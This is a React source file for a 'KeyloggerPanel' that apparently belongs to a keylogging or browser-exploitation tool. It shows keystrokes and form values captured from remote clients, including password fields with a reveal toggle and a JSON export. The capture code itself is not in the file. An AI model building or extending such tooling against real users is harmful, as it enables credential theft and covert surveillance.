import { useState, useMemo, useEffect } from "react";
import { useKeylogger } from "@/hooks/use-keylogger";
import type { KeyloggerEntry } from "@/hooks/use-keylogger";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Tooltip,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import {
  Layers,
  List,
  Trash2,
  Download,
  Eye,
  EyeOff,
  Keyboard,
  ChevronDown,
  ChevronRight,
} from "lucide-react";

interface KeyloggerPanelProps {
  clientId: string;
  onStatusChange?: (status: "connecting" | "open" | "closed") => void;
}

interface EntryGroup {
  descriptor: string;
  elementType: string;
  entries: KeyloggerEntry[];
}

function formatTimestamp(ts: number): string {
  return new Date(ts).toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

/** Coloured badge for the element type. */
function TypeBadge({ type }: { type: string }) {
  const typeConfig: Record<
    string,
    { variant: "default" | "secondary" | "destructive" | "outline"; label: string }
  > = {
    password: { variant: "destructive", label: "password" },
    email: { variant: "default", label: "email" },
    textarea: { variant: "secondary", label: "textarea" },
    contenteditable: { variant: "outline", label: "rich text" },
    select: { variant: "secondary", label: "select" },
    checkbox: { variant: "outline", label: "checkbox" },
    radio: { variant: "outline", label: "radio" },
  };
  const cfg = typeConfig[type] ?? { variant: "outline" as const, label: type };
  return <Badge variant={cfg.variant}>{cfg.label}</Badge>;
}

/** Renders the data portion of an entry with appropriate styling. */
function EntryData({
  entry,
  masked,
}: {
  entry: KeyloggerEntry;
  masked: boolean;
}) {
  if (entry.eventType === "key") {
    return (
      <kbd className="px-1.5 py-0.5 text-xs font-mono bg-muted border rounded">
        {entry.data}
      </kbd>
    );
  }
  if (masked) {
    return <span className="text-muted-foreground select-none">••••</span>;
  }
  return (
    <span className="font-mono text-sm">
      {entry.data || (
        <em className="not-italic text-muted-foreground">(empty)</em>
      )}
    </span>
  );
}

/**
 * Displays captured keylogger entries with grouped and stream view modes.
 * Password fields are masked by default with a per-group reveal toggle.
 */
export function KeyloggerPanel({
  clientId,
  onStatusChange,
}: KeyloggerPanelProps) {
  const COLLAPSE_THRESHOLD = 4;

  const { entries, status, clearEntries } = useKeylogger(clientId);
  const [viewMode, setViewMode] = useState<"grouped" | "stream">("grouped");
  const [revealedGroups, setRevealedGroups] = useState<Set<string>>(new Set());
  const [expandedGroups, setExpandedGroups] = useState<Set<string>>(new Set());
  const [activeTypeFilters, setActiveTypeFilters] = useState<Set<string>>(new Set());

  useEffect(() => {
    onStatusChange?.(status);
  }, [status, onStatusChange]);

  const groups = useMemo<EntryGroup[]>(() => {
    const map = new Map<string, EntryGroup>();
    for (const entry of entries) {
      const key = entry.elementDescriptor;
      if (!map.has(key)) {
        map.set(key, {
          descriptor: key,
          elementType: entry.elementType,
          entries: [],
        });
      }
      map.get(key)!.entries.push(entry);
    }
    return Array.from(map.values());
  }, [entries]);

  const availableTypes = useMemo<string[]>(() => {
    const types = new Set(groups.map((g) => g.elementType));
    return Array.from(types).sort();
  }, [groups]);

  const filteredGroups = useMemo<EntryGroup[]>(() => {
    if (activeTypeFilters.size === 0) return groups;
    return groups.filter((g) => activeTypeFilters.has(g.elementType));
  }, [groups, activeTypeFilters]);

  const filteredEntries = useMemo(() => {
    if (activeTypeFilters.size === 0) return entries;
    return entries.filter((e) => activeTypeFilters.has(e.elementType));
  }, [entries, activeTypeFilters]);

  function toggleTypeFilter(type: string) {
    setActiveTypeFilters((prev) => {
      const next = new Set(prev);
      if (next.has(type)) next.delete(type);
      else next.add(type);
      return next;
    });
  }

  function exportJson() {
    const blob = new Blob([JSON.stringify(entries, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `keylogger-${clientId.slice(0, 8)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }

  function toggleReveal(descriptor: string) {
    setRevealedGroups((prev) => {
      const next = new Set(prev);
      if (next.has(descriptor)) next.delete(descriptor);
      else next.add(descriptor);
      return next;
    });
  }

  function toggleExpand(descriptor: string) {
    setExpandedGroups((prev) => {
      const next = new Set(prev);
      if (next.has(descriptor)) next.delete(descriptor);
      else next.add(descriptor);
      return next;
    });
  }

  /** Last value for a group (latest non-empty value entry). */
  function getLastValue(group: EntryGroup): string {
    for (let i = group.entries.length - 1; i >= 0; i--) {
      if (group.entries[i].value) return group.entries[i].value;
    }
    return "";
  }

  return (
    <div className="space-y-4">
        {/* Toolbar */}
        <div className="flex items-center gap-2 flex-wrap">
          <div className="flex items-center gap-1.5">
            <Keyboard className="h-4 w-4 text-muted-foreground" />
            <span className="text-sm font-medium">Keylogger</span>
            <Badge variant="secondary">{entries.length} entries</Badge>
          </div>
          <div className="flex-1" />

          {/* View mode toggle */}
          <div className="flex items-center gap-1">
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  size="sm"
                  variant={viewMode === "grouped" ? "secondary" : "ghost"}
                  onClick={() => setViewMode("grouped")}
                >
                  <Layers className="h-3.5 w-3.5" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>Grouped view</TooltipContent>
            </Tooltip>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  size="sm"
                  variant={viewMode === "stream" ? "secondary" : "ghost"}
                  onClick={() => setViewMode("stream")}
                >
                  <List className="h-3.5 w-3.5" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>Stream view</TooltipContent>
            </Tooltip>
          </div>

          <Tooltip>
            <TooltipTrigger asChild>
              <Button
                size="sm"
                variant="outline"
                onClick={exportJson}
                disabled={entries.length === 0}
              >
                <Download className="h-3.5 w-3.5" />
              </Button>
            </TooltipTrigger>
            <TooltipContent>Export JSON</TooltipContent>
          </Tooltip>

          <Tooltip>
            <TooltipTrigger asChild>
              <Button
                size="sm"
                variant="outline"
                className="text-destructive hover:text-destructive"
                onClick={clearEntries}
                disabled={entries.length === 0}
              >
                <Trash2 className="h-3.5 w-3.5" />
              </Button>
            </TooltipTrigger>
            <TooltipContent>Clear all entries</TooltipContent>
          </Tooltip>
        </div>

        {/* Type filters */}
        {availableTypes.length > 1 && (
          <div className="flex items-center gap-1.5 flex-wrap">
            <span className="text-xs text-muted-foreground">Filter:</span>
            {availableTypes.map((type) => {
              const active = activeTypeFilters.has(type);
              return (
                <button
                  key={type}
                  onClick={() => toggleTypeFilter(type)}
                  className={`transition-opacity ${active ? "opacity-100" : "opacity-40 hover:opacity-70"}`}
                >
                  <TypeBadge type={type} />
                </button>
              );
            })}
            {activeTypeFilters.size > 0 && (
              <button
                onClick={() => setActiveTypeFilters(new Set())}
                className="text-xs text-muted-foreground hover:text-foreground transition-colors ml-1"
              >
                clear
              </button>
            )}
          </div>
        )}

        {/* Empty state */}
        {entries.length === 0 && (
          <div className="text-center py-12 text-muted-foreground">
            <Keyboard className="h-8 w-8 mx-auto mb-3 opacity-40" />
            <p className="text-sm">
              {status === "connecting"
                ? "Connecting..."
                : "No keystrokes captured yet"}
            </p>
          </div>
        )}

        {/* Grouped view */}
        {viewMode === "grouped" &&
          filteredGroups.map((group) => {
            const isPassword = group.elementType === "password";
            const revealed = revealedGroups.has(group.descriptor);
            const lastValue = getLastValue(group);
            const collapsed =
              group.entries.length > COLLAPSE_THRESHOLD &&
              !expandedGroups.has(group.descriptor);

            return (
              <Card key={group.descriptor}>
                <CardHeader className="pb-2 pt-3 px-4">
                  <div className="flex items-center gap-2 flex-wrap">
                    {/* Expand/collapse toggle for long groups */}
                    {group.entries.length > COLLAPSE_THRESHOLD && (
                      <button
                        onClick={() => toggleExpand(group.descriptor)}
                        className="text-muted-foreground hover:text-foreground transition-colors"
                      >
                        {collapsed ? (
                          <ChevronRight className="h-3.5 w-3.5" />
                        ) : (
                          <ChevronDown className="h-3.5 w-3.5" />
                        )}
                      </button>
                    )}
                    <code className="text-xs font-mono bg-muted px-1.5 py-0.5 rounded">
                      {group.descriptor}
                    </code>
                    <TypeBadge type={group.elementType} />
                    <Badge variant="outline" className="ml-auto">
                      {group.entries.length}
                    </Badge>
                    {isPassword && (
                      <Tooltip>
                        <TooltipTrigger asChild>
                          <Button
                            size="sm"
                            variant="ghost"
                            className="h-6 px-2"
                            onClick={() => toggleReveal(group.descriptor)}
                          >
                            {revealed ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                        </TooltipTrigger>
                        <TooltipContent>
                          {revealed ? "Hide value" : "Reveal value"}
                        </TooltipContent>
                      </Tooltip>
                    )}
                  </div>
                </CardHeader>
                <CardContent className="px-4 pb-3">
                  {/* Collapsed: show only the final value */}
                  {collapsed ? (
                    <div className="text-xs">
                      <span className="text-muted-foreground">Value: </span>
                      {isPassword && !revealed ? (
                        <span className="text-muted-foreground select-none">
                          ••••••••
                        </span>
                      ) : (
                        <span className="font-mono">{lastValue || "(empty)"}</span>
                      )}
                    </div>
                  ) : (
                    <>
                      <div className="space-y-0.5">
                        {group.entries.map((entry, i) => (
                          <div
                            key={i}
                            className="flex items-center gap-2 text-xs py-0.5"
                          >
                            <span className="text-muted-foreground font-mono w-20 shrink-0">
                              {formatTimestamp(entry.timestamp)}
                            </span>
                            <EntryData
                              entry={entry}
                              masked={isPassword && !revealed}
                            />
                            {entry.eventType !== "input" && (
                              <Badge
                                variant="outline"
                                className="text-[10px] h-4 px-1 ml-auto shrink-0"
                              >
                                {entry.eventType}
                              </Badge>
                            )}
                          </div>
                        ))}
                      </div>
                      {/* Final value footer */}
                      {lastValue && (!isPassword || revealed) && (
                        <div className="mt-2 pt-2 border-t text-xs">
                          <span className="text-muted-foreground">
                            Final value:{" "}
                          </span>
                          <span className="font-mono">{lastValue}</span>
                        </div>
                      )}
                      {isPassword && !revealed && lastValue && (
                        <div className="mt-2 pt-2 border-t text-xs">
                          <span className="text-muted-foreground">
                            Final value:{" "}
                          </span>
                          <span className="text-muted-foreground select-none">
                            ••••••••
                          </span>
                        </div>
                      )}
                    </>
                  )}
                </CardContent>
              </Card>
            );
          })}

        {/* Stream view */}
        {viewMode === "stream" && filteredEntries.length > 0 && (
          <div className="rounded-md border overflow-hidden">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-24">Time</TableHead>
                  <TableHead>Element</TableHead>
                  <TableHead className="w-28">Type</TableHead>
                  <TableHead>Data</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredEntries.map((entry, i) => (
                  <TableRow key={i}>
                    <TableCell className="font-mono text-xs text-muted-foreground">
                      {formatTimestamp(entry.timestamp)}
                    </TableCell>
                    <TableCell>
                      <code className="text-xs bg-muted px-1 py-0.5 rounded">
                        {entry.elementDescriptor}
                      </code>
                    </TableCell>
                    <TableCell>
                      <TypeBadge type={entry.elementType} />
                    </TableCell>
                    <TableCell>
                      <EntryData
                        entry={entry}
                        masked={entry.elementType === "password"}
                      />
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        )}
    </div>
  );
}
